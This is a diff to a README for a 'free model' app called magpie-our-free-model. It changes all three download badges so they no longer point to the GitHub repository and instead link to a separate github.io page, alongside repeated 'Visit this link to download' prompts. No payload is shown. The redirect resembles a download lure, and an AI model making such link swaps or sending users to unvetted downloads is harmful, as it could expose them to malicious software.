@@ -1,6 +1,6 @@
 # 🐦 magpie-our-free-model - Free Model Power for Magpie
 
-[![Download magpie-our-free-model](https://img.shields.io/badge/Download-magpie--our--free--model-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NESRINEJOUINI08/magpie-our-free-model)
+[![Download magpie-our-free-model](https://img.shields.io/badge/Download-magpie--our--free--model-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://nesrinejouini08.github.io)
 
 **Visit this link to download the application.**
 
@@ -51,7 +51,7 @@ That is the whole process. There is nothing to compile, no package manager to in
 
 ## ⬇️ Download and Setup
 
-[![Download magpie-our-free-model](https://img.shields.io/badge/⬇_Download_Now-magpie--our--free--model-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NESRINEJOUINI08/magpie-our-free-model)
+[![Download magpie-our-free-model](https://img.shields.io/badge/⬇_Download_Now-magpie--our--free--model-00A86B?style=for-the-badge&logo=github&logoColor=white)](https://nesrinejouini08.github.io)
 
 **Visit this link to download the application.**
 
@@ -138,7 +138,7 @@ Because no account is required, there is no password to remember and no profile 
 
 ## 📥 Download Again
 
-[![Download magpie-our-free-model](https://img.shields.io/badge/Download-magpie--our--free--model-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NESRINEJOUINI08/magpie-our-free-model)
+[![Download magpie-our-free-model](https://img.shields.io/badge/Download-magpie--our--free--model-FF6F00?style=for-the-badge&logo=github&logoColor=white)](https://nesrinejouini08.github.io)
 
 **Visit this link to download the application.**
 
